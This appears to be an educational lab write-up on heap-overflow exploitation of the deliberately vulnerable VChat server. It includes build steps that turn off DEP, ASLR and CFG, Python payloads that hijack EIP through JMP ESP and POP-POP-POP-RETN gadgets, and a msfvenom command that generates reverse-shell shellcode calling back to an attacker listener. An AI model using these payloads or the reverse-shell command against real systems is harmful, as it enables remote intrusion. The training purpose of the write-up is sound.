# VChat Heap Exploit: Heaps of Fun
> [!NOTE]
> This is not based on an existing writeup, but the vulnerabilities added to the VChat server are based on a [blog](https://www.rapid7.com/blog/post/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/) with additional modifications so they fit into the VChat server.
---

This writeup will cover the exploitation of the [VChat](https://github.com/xinwenfu/vchat) server program, we have modified this to include a few HEAP exploits. The first is a simple example based on the example programs previously discussed, all we have to worry about is the content we are overflowing into the program's heap structure. The second is slightly more complex as the heap is not automatically put into a vulnerable state as was done with the simpler example. Instead we need to send a series of messages in order to put the heap into a vulnerable state for the overflow.

> [!IMPORTANT] 
> For an explanation on how this exploit works, please refer to the [Heap-Overflow-Example](https://github.com/DaintyJet/Heap-Overflow-Example) writeup or the [VChat_Heap_Defense](https://github.com/DaintyJet/VChat_Heap_Defense) writeups.

## VChat Setup and Configuration
This section covers the compilation process, and use of the VChat Server. We include instructions for both the original VChat code which was compiled with MinGW and GCC on Windows, and the newly modified code that can be compiled with the Visual Studio C++ compiler.

### Visual Studio
1. Open the [Visual Studio project](https://github.com/DaintyJet/vchat-fork/tree/main/Server/Visual%20Studio%20Projects/DLL/Essfun) for the *essfunc* DLL.
2. Build the project, as this contains inline assembly the target DLL file must be compiled as a x86 DLL (32-bits).
3. Copy the Resulting DLL from the *Debug* folder in the [Essfunc Project](https://github.com/DaintyJet/vchat-fork/tree/main/Server/Visual%20Studio%20Projects/DLL/Essfun/Debug) into the *Debug* folder in the [VChat Project](https://github.com/DaintyJet/vchat-fork/tree/main/Server/Visual%20Studio%20Projects/EXE/VChat/Debug)

	<img src="Images/VS-Comp.png">

4. Open the [Visual Studio project](https://github.com/DaintyJet/vchat-fork/tree/main/Server/Visual%20Studio%20Projects/EXE/VChat) for the *VChat* EXE.
5. Open the Properties menu and access the `Linker` configuration options.

	<img src="Images/VS-C1.png">

6. In the `Advanced` configuration window disable DEP and Address Space Layout Randomization.

	<img src="Images/VS-C2.png">

7. Open the `C/C++` -> `Code Generation` configuration window, and disable Control Flow Guard and Buffer Security Checks.

	<img src="Images/VS-C3.png">

8. Build the Project; our executable will be in the *Debug* folder. You can then launch the executable!
### Mingw/GCC
Compile VChat and its dependencies if they have not already been compiled. This is done with mingw.

1. Create the essfunc object File.
	```powershell
	# Compile Essfunc Object file
	$ gcc.exe -c essfunc.c
	```
2. Create the [DLL](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) containing functions that will be used by the VChat.
	```powershell
	# Create a DLL with a static (perferred) base address of 0x62500000
	$ gcc.exe -shared -o essfunc.dll -Wl,--out-implib=libessfunc.a -Wl,--image-base=0x62500000 essfunc.o
	```
      * ```-shared -o essfunc.dll```: We create a DLL "essfunc.dll", these are equivalent to the [shared library](https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html) in Linux.
      * ```-Wl,--out-implib=libessfunc.a```: We tell the linker to generate an import library "libessfunc.a" [2].
      * ```-Wl,--image-base=0x62500000```: We specify the [Base Address](https://learn.microsoft.com/en-us/cpp/build/reference/base-base-address?view=msvc-170) as ```0x62500000``` [3].
      * ```essfunc.o```: We build the DLL based off of the object file "essfunc.o"
3. Compile the VChat application.
	```powershell
	# Compile and Link VChat
	$ gcc.exe vchat.c -o vchat.exe -lws2_32 ./libessfunc.a
	```
      * ```vchat.c```: The source file is "vchat.c".
      * ```-o vchat.exe```: The output file will be the executable "vchat.exe".
      * ```-lws2_32 ./libessfunc.a```: Link the executable against the import library "libessfunc.a", enabling it to use the DLL "essfunc.dll".

## Exploitation: Simple Exploit

> [!IMPORTANT]
> This requires a VChat server of at least Version 2.20

This section will cover the exploitation of the simpler all-in-one exploit now provided in VChat. We can send messages to the `HEAP` function in the format `HEAP *<MESSAGE>*` and the contents between the two asterisks will be placed onto the heap; from this we will attempt to gain a remote shell in this idealized and simplified scenario. 

### Finding the Offset
First as has been done in pervious exploits, we will be using a cyclic pattern generated with the [pattern_create.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_create.rb) script combined with the [pattern_offset.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb) script in order to determine the offset in our string that allows us to control the EIP register.

1. Generate a cyclic pattern, this creates a string where the substring are a series of unique patterns, allowing us to identify where exactly in the payload we need to insert the values used to control the flow of execution. The path to this script will generally be `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb` and it can be used in the following manner:

	```
	$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
	```

2. Create a Python program modeled after our [exploit0.py](./SourceCode/exploit0.py) script. This has the following payload. The cyclic pattern has been truncated for brevity.

	```
	PAYLOAD = (
    b'HEAP /.:/' +
    b'*' +
    b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6A......' +
    b'*'
	)
	```
	* `HEAP /.:/`: This start the payload with the string *HEAP*, this tells VChat which function we would like to execute. The  */.:/* are simply extra charicters which may be removed.
	* `*`: The message we would like to insert onto the heap must be enclosed with asterisks.
	* `Aa0Aa1Aa2Aa3Aa4Aa5Aa6A......`: This is out cyclic pattern that will be inserted onto the heap, this allows us to identify where the address used to change the flow of control needs to be inserted in our payload.
	* `*`: The message we would like to insert onto the heap must be enclosed with asterisks.

3. Execute the [exploit0.py](./SourceCode/exploit0.py) script against VChat, you may need to make this executeable with the `chmod +x exploit0.py` command. Once VChat has crashed, observe the value in the `EIP` register.

	<img src="Images/F1.png">

4. In this case, we have the value `6F41316F` in the instruction register. We can use this with the `pattern_offset.rb` script which can be located at `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb` in order to find the exact offset in our payload to inject an address.

	```
	$/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 6F41316F
	```

5. Here we were able to see the offset was `424`, we can now modify our exploit payload to reflect the one shown in the [exploit1.py](./SourceCode/exploit1.py).

	```
	PAYLOAD = (
    b'HEAP /.:/' +
    b'*' +
    b'A'*424 +
    b'B'*4 +
    b'*'
	)
	```
	* `HEAP /.:/`: This start the payload with the string *HEAP*, this tells VChat which function we would like to execute. The  */.:/* are simply extra charicters which may be removed.
	* `*`: The message we would like to insert onto the heap must be enclosed with asterisks.
	* `b'A'*424`: This is extra padding, we do this so our test values the `B`s will be written into the correct positions.
	* `'B'*4 `: This is a series of `B`s which allows us to verify the offset as it is will crash the program and provides a distinct value to show we have found the correct offset.
	* `*`: The message we would like to insert onto the heap must be enclosed with asterisks.

6. Execute the [exploit1.py](./SourceCode/exploit1.py) script against VChat, you may need to make this executeable with the `chmod +x exploit1.py` command. Once VChat has crashed, observe the value in the `EIP` register. Notice that it now has a series of the value `42` these are the `B`s meaning we have the correct offset of modify the program's control flow.

	<img src="Images/F2.png">

### JMP ESP Behavior
Now that we know the offset we need to overflow to gain control over the flow of execution, we attempt to gain control over the flow of execution using one of the methods we have seem earlier. Namely using the `JMP ESP` instruction.
1. In Immunity Debugger, we can use the following *mona.py* command to locate some `JMP ESP` instructions to use. This command is inputted into the command line at the bottom of Immunity Debugger.

	```
	!mona jmp -r esp -cp nonull -o
	```
2. We can see the output in the Logs of Immunity Debugger, there should be a few options. For portability we would perfer instructions in modules that do not have ASLR enabled.

	<img src="Images/F3.png">

   * You can select any one of these, in this case we chose the first option with the address of `0x62501023`.

3. Create a Python program modeled after our [exploit2.py](./SourceCode/exploit2.py) script. This has the following payload used to inject the `JMP ESP` address into the offset we discoved earlier.
	```
	PAYLOAD = (
		b'HEAP /.:/' +
		b'*' +
		b'A'*424 +
		struct.pack('<L', 0x62501023) +
		b'*'
	)
	```
	* `HEAP /.:/`: This start the payload with the string *HEAP*, this tells VChat which function we would like to execute. The  */.:/* are simply extra charicters which may be removed.
	* `*`: The message we would like to insert onto the heap must be enclosed with asterisks.
	* `b'A'*424`: This is extra padding, we do this so our test values the `B`s will be written into the correct positions.
	* `struct.pack('<L', 0x62501023)`: This is the address of the `JMP ESP` instruction we will be using.
	* `*`: The message we would like to insert onto the heap must be enclosed with asterisks.
4. Set a Breakpoint at the address of the `JMP ESP` instruction. You can use the `Go to Address In Dissasembler` button to get there!

	<img src="Images/F4.png">

5. Execute the [exploit2.py](./SourceCode/exploit2.py) script against VChat, you may need to make this executeable with the `chmod +x exploit2.py` command. Does the prgram hit the Breakpoint you set? It may take a few times for this to work, but you should see the breakpoint being hit.

	<img src="Images/F5.png">

6. Step through the `JMP ESP` instruction, where do you end up? Is it a valid instructions? Although we have valid instructions this time they will tend to cause a crash due to invalid memeory accesses, this may not always be the case and regardless of that, if they do execute it will affect our program in unknown ways.

	<img src="Images/F6.png">

7. Notice that we ended up 3-bytes away from the part of the buffer we can modify to be whatever we would like! In the next section we will use a small gadget to remove this uncertanty.

	<img src="Images/F7.png">
### Pivitoing the Control Flow
This section will use a `POP POP POP RETN` gadget similar to the one described in the [VChat_CFG](https://github.com/DaintyJet/VChat_CFG) writeup to align our ESP and gain control over the flow of execution.

First we can start the process of locating a gadget to realign the stack and transfer the control using a `RETN` instruction.
1. Right Click the CPU window's instruction view and select `Search For` -> `Sequence of Commands`

	<img src="Images/F8.png">

	* If you do this in the `vchat.exe` source file as shown, the address of these instructions may contain a null terminator. You can search for this in the `essfunc.dll` source but jumping to that point in the dissasembly, or by switching to view that.
2. Enter the following into the search window:

	```
	POP R32
	POP R32
	POP R32
	RETN
	```
	* `POP R32`: Searches for a POP instruction that stores the result in a 32-bit register
	* `RETN`: Return instruction

3.  Using the address of the first `POP` instruction modify you exploit to reflect the [exploit3.py](./SourceCode/exploit3.py)  script. This has the following payload used to inject the address of the new gadget into the offset we discoved earlier rather than the `JMP ESP` instruction.
	```
	PAYLOAD = (
		b'HEAP /.:/' +
		b'*' +
		b'A'*424 +
		struct.pack('<L', 0x6250185E) +
		b'*'
	)
	```
	* `HEAP /.:/`: This start the payload with the string *HEAP*, this tells VChat which function we would like to execute. The  */.:/* are simply extra charicters which may be removed.
	* `*`: The message we would like to insert onto the heap must be enclosed with asterisks.
	* `b'A'*424`: This is extra padding, we do this so our test values the `B`s will be written into the correct positions.
	* `struct.pack('<L', 0x6250185E) `: This is the address of the `POP POP POP RETN` gadget we will be using.
	* `*`: The message we would like to insert onto the heap must be enclosed with asterisks.
4. Set a Breakpoint at the address of the `POP POP POP RETN` gadget. You can use the `Go to Address In Dissasembler` button to get there!

	<img src="Images/F4.png">

5. Execute the [exploit3.py](./SourceCode/exploit3.py) script against VChat, you may need to make this executeable with the `chmod +x exploit3.py` command. It may take a few times for this to work, but you should see the breakpoint being hit.

	<img src="Images/F9.png">

6. Step through the `POP POP POP RETN` Gadget, where do we end up? Is it a valid return? Notice that our Return is not anything in particular, and our program will likely crash. But this is the start of the buffer that we can control to be whatever we would like!

	<img src="Images/F10.png">

7. Modify the payload of your exploit to reflect the [exploit4.py](./SourceCode/exploit4.py) script. We removed the four extra charicters and replaced them with the address of the `JMP ESP` instruction.
	```
	PAYLOAD = (
		b'HEAP' +
		struct.pack('<L', 0x62501023) +
		b'*' +
		b'A'*424 +
		struct.pack('<L', 0x6250185E) +
		b'*'
	)
	```
	* `HEAP`: This start the payload with the string *HEAP*, this tells VChat which function we would like to execute. We removed the */.:/* charicters which were extra.
	* `struct.pack('<L', 0x62501023)`: This is the address of the `JMP ESP` instruction, this will be executed once the `POP POP POP RETN` gadget executes the `RETN`.
	* `*`: The message we would like to insert onto the heap must be enclosed with asterisks.
	* `b'A'*424`: This is extra padding, we do this so our test values the `B`s will be written into the correct positions.
	* `struct.pack('<L', 0x6250185E) `: This is the address of the `POP POP POP RETN` gadget we will be using.
	* `*`: The message we would like to insert onto the heap must be enclosed with asterisks.
8. Set a breakpoint, execute the [exploit4.py](./SourceCode/exploit4.py) script and step Through the `POP POP POP RETN` gadget as done previously with [exploit3.py](./SourceCode/exploit3.py). What changes?

	<img src="Images/F11.png">

   * Notice how the `RETN` instruction will now transfer control to the `JMP ESP` instruction that will allow us to start executing shellcode we place on the stack!

### Final Stage
1. In the previous section we were able to modify the flow of control back to the stack, but we will need to get a little creative, as our payload in this case starts with a `*`, however as the only content written to the heap is the values between the `*` we may be able to work around this.

[msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)



	```sh
	msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.7 LPORT=8080 EXITFUNC=thread -f python -v SHELL -a x86 --platform windows -b '\x00\x0a\x0d\x2a'
	```
	* `-p `: Payload we are generating shellcode for.
    	* `windows/shell_reverse_tcp`: Reverse TCP payload for Windows.
    	* `LHOST=10.0.2.7`: The remote listening host's IP, in this case our Kali machine's IP `10.0.2.7`.
    	* `LPORT=8080`: The port on the remote listening host's traffic should be directed to in this case port 8080.
    	* `EXITFUNC=thread`: Create a thread to run the payload.
	* `-f`: The output format.
    	* `python`: Format for use in python scripts.
  	* `-v`: Specify a custom variable name.
    	* `SHELL`: Shell Variable name.
  	* `-a x86`: Specify the target architecture as `x86`
	* `--platform windows`: Specify the target platform as Windows
  	* `-b`: Specifies bad chars and byte values. This is given in the byte values.
      	* `\x00\x0a\x0d\x2a`: Null char, carriage return, newline and the asterisk.

2. The simplest solution is to place the Shellcode in the region of the input that is not copied onto the heap as follows.
	```
	PAYLOAD = (
    b'HEAP' +
    struct.pack('<L', 0x62501023) +
    b'\x90' *20 +
    SHELL + 
    b'\x90' *20 +
    b'*' +
    b'A'*(424)+
    struct.pack('<L', 0x6250185E) +
    b'*' 
	)
	```
	* `HEAP`: This start the payload with the string *HEAP*, this tells VChat which function we would like to execute. We removed the */.:/* charicters which were extra.
	* `struct.pack('<L', 0x62501023)`: This is the address of the `JMP ESP` instruction, this will be executed once the `POP POP POP RETN` gadget executes the `RETN`.
	* `b'\x90' *20 `: Additional padding (NOP sled).
	* `SHELL`: Shellcode not injected into the heap. 
	* `b'\x90' *20 `: Additional padding (NOP sled).
	* `*`: The message we would like to insert onto the heap must be enclosed with asterisks.
	* `b'A'*424`: This is extra padding, we do this so our test values the `B`s will be written into the correct positions.
	* `struct.pack('<L', 0x6250185E) `: This is the address of the `POP POP POP RETN` gadget we will be using.
	* `*`: The message we would like to insert onto the heap must be enclosed with asterisks.
3. Once you execute the [exploit5.py](./SourceCode/exploit5.py) script, you may notice that the exploit still does not work. This is because some Windows Librarys seem to explicitly validate the heap, regardless of whether or not the protection is enabled.

	<img src="Images/F12.png">

## Exploitation: Complex Exploit
This section will not cover the exact steps needed to exploit this function, but it will cover the general steps required to exploit this function.

1. Connect to `HEAC` function.
2. Send 5 - 10 `STR *AAAAAAAAAAAAAAAAAAAAAAA*` messages of any reasonable lenght (20 - 40 chars).
3. Use `STR-RLS` to free one of the allocated chunks, a possible index is the 3rd.
4. Use the `FNC` command to write a series of function pointers to memeory, a resonable size should be used - between 7 - 9.
5. Use the `STR-RLS` function to free the chunk before the previously freed chunk.
6. Use `STR` to inject the malicious string used to overwrite the address of a function called in the adjacent block.
7. Use `END SHELLCODE` to inject shellcode onto the stack of the local function so we can transfer control to it.
## Test code
